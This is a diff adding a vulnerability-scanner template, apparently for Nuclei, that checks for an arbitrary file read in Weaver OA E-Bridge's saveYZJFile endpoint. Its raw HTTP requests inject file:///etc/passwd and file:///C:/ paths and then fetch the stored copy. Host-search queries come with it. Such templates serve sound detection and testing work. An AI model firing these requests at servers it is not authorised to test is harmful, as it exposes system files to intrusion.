@@ -1,0 +1,51 @@
+id: weaver-ebridge-lfi
+
+info:
+  name: Weaver E-Bidge saveYZJFile - Local File Read
+  author: SleepingBag945
+  severity: high
+  description: |
+    There is an arbitrary file reading vulnerability in the Weaver OA E-Bridge saveYZJFile interface. An attacker can read any file on the server through the vulnerability.
+  reference:
+    - https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    verified: true
+    max-request: 4
+    shodan-query: eBridge_JSessionid
+    fofa-query: app="泛微云桥e-Bridge"
+  tags: eBridge,weaver,oa,lfi,lfr,intrusive
+
+http:
+  - raw:
+      - |
+        GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl={{path}} HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /file/fileNoLogin/{{idname}} HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: pitchfork
+    payloads:
+      path:
+        - file:///C:/&fileExt=txt
+        - file:///etc/passwd&fileExt=txt
+
+    stop-at-first-match: true
+    skip-variables-check: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains_all(body_1,'id', 'filepath') && !contains(tolower(body), 'status\":\"error')"
+          - "status_code_2 == 200 && contains(header_2, 'filename=')"
+          - "contains(body_2, 'Program Files') || regex('root:.*:0:0:', body)"
+        condition: and
+
+    extractors:
+      - type: regex
+        name: idname
+        internal: true
+        group: 1
+        regex:
+          - '"id":"(.*?)"'
+
+# digest: 4a0a004730450221008c4256c39ae9fa982146f9037e0dcd33f2a15d23dd3d12c914495ad9fef3c3ee02207f8267affa69450561dc42171c99f792b3f9d837d41802f9f85ba90fa739189e:922c64590222798bb761d5b6d8e72950
